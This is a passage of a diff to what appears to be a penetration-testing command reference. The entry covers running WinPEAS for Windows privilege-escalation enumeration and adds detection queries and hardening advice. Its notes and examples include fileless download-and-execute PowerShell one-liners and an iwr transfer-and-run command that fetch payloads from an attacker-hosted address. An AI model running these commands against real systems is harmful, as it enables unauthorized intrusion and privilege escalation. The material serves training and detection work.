+      "notes": "=== EXE (full, best output) ===\n  winPEASx64.exe\n  winPEASx86.exe\n  winPEASx64.exe quiet cmd fast     # quiet banner, cmd checks, fast mode\n  winPEASx64.exe log=winpeas.txt    # save output\n\n=== BAT (no .NET needed) ===\n  winPEAS.bat\n\n=== PS1 / FILELESS ===\n  # Download + run in memory:\n  iex (New-Object Net.WebClient).DownloadString(\"http://<lhost>/winPEAS.ps1\")\n\n=== TRANSFER FIRST (no egress) ===\n  # Attacker:\n  python3 -m http.server 80\n  # Target (PowerShell):\n  iwr http://<lhost>/winPEASx64.exe -OutFile C:\\Windows\\Temp\\wp.exe; C:\\Windows\\Temp\\wp.exe\n\n=== USEFUL ARGS ===\n  fast          # skip slow checks\n  searchall     # search all drives for sensitive files\n  cmd           # run cmd-based checks\n  systeminfo / userinfo / servicesinfo / applicationsinfo / windowscreds\n\n=== READING RESULTS ===\n  # RED = likely exploitable; GREEN = defense/good config\n  # Focus on: service misconfigs, SeImpersonate/SeBackup/etc privileges,\n  #   AlwaysInstallElevated, unquoted paths, stored creds, autologon\n\n=== ALTERNATIVES / COMPLEMENTS ===\n  PrivescCheck.ps1   # PowerShell, AV-friendly\n  Seatbelt.exe       # C# situational awareness\n  PowerUp.ps1        # service-focused + auto-exploit\n  wesng / Watson     # kernel CVE matching\n  # Verify findings manually (accesschk, sc qc, icacls)",
+      "examples": [
+        {
+          "label": "Full EXE enumeration",
+          "command": "winPEASx64.exe quiet cmd fast log=winpeas.txt"
+        },
+        {
+          "label": "Fileless PS1 via memory",
+          "command": "iex (New-Object Net.WebClient).DownloadString(\"http://10.10.14.5/winPEAS.ps1\")"
+        },
+        {
+          "label": "Transfer and run",
+          "command": "iwr http://10.10.14.5/winPEASx64.exe -OutFile C:\\Windows\\Temp\\wp.exe; C:\\Windows\\Temp\\wp.exe"
+        }
+      ],
+      "references": [
+        {
+          "title": "PEASS-ng",
+          "url": "https://github.com/peass-ng/PEASS-ng"
+        },
+        {
+          "title": "MITRE T1082 - System Information Discovery",
+          "url": "https://attack.mitre.org/techniques/T1082/"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "privesc-privesccheck",
+          "note": "PrivescCheck is the AV-friendly PowerShell alternative.",
+          "rel": "alternative"
+        },
+        {
+          "id": "sharpup-audit",
+          "note": "SharpUp/PowerUp auto-exploit service misconfigs WinPEAS finds.",
+          "rel": "next"
+        },
+        {
+          "id": "privesc-wesng",
+          "note": "Match systeminfo to missing patches/CVEs.",
+          "rel": "next"
+        }
+      ],
+      "defense": {
+        "why_it_works": "WinPEAS queries normal, user-readable Windows state (services, registry, ACLs, privileges, environment). It is noisy but uses standard APIs, so it runs reliably even as a low-priv user.",
+        "prerequisites": "Any shell on the target; appropriate WinPEAS variant (exe/bat/ps1).",
+        "impact": "Comprehensive mapping of every local Windows privesc vector in one pass.",
+        "detection": "[MITRE T1082/T1083] winpeas binary signatures (EDR/AV flag it by default); burst of sc query/reg query/whoami /priv/icacls/accesschk; mass registry and ACL enumeration.",
+        "artifacts": "winPEAS*.exe/bat/ps1 on disk; AMSI/Defender detections; 4688 process-creation spikes of enumeration utilities.",
+        "splunk_spl": "index=windows EventCode=4688 (NewProcessName=\"*winPEAS*\" OR CommandLine=\"*winpeas*\" OR CommandLine=\"*accesschk*\")\n| table _time, SubjectUserName, NewProcessName, CommandLine",
+        "elastic_kql": "process.name:*winPEAS* or process.command_line:(*winpeas* or *accesschk*)",
+        "sentinel_kql": "DeviceProcessEvents\n| where FileName has \"winPEAS\" or ProcessCommandLine has \"winpeas\"\n| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine",
+        "sigma_rules": "win_privesc_enumeration_winpeas",
+        "prevention": "Harden services (quoted paths, strong ACLs), disable AlwaysInstallElevated, remove dangerous token privileges from non-admins, store no plaintext creds, keep patched; EDR/AV signatures catch winpeas by default; ASR + attack-surface reduction.",
+        "sources": [
+          "PEASS-ng",
+          "https://attack.mitre.org/techniques/T1082/"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "WinPEAS / privesc enumeration execution",
+            "logic": "DeviceProcessEvents\n| where FileName has_any (\"winPEAS\",\"winPEASx64\",\"winPEASx86\") or ProcessCommandLine has \"winpeas\"\n  or (FileName == \"accesschk.exe\" and ProcessCommandLine has_any (\"-uwcqv\",\"-accepteula\"))\n| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine",
+            "data_source": "defender-endpoint",
+            "attack": [
+              "T1082",
+              "T1083"
+            ],
+            "fidelity": "signature",
+            "confidence": "high",
+            "false_positives": "Authorized security assessments",
+            "tuning": "Renamed binaries evade name match - also alert on rapid sc/reg/whoami enumeration bursts"
+          }
+        ]
+      }
+    },
+    {
       "type": "command",
       "platform": "windows",
       "requires": [
@@ -190478,8 +191074,8 @@ const COMMAND_DATA = {
       }
     }
   ],
-  "totalCommands": 1066,
-  "buildDate": "2026-11-11T05:11:49.964Z",
+  "totalCommands": 1072,
+  "buildDate": "2026-11-11T05:16:42.447Z",
   "certifications": [
     "CDSA",
     "CPTS",
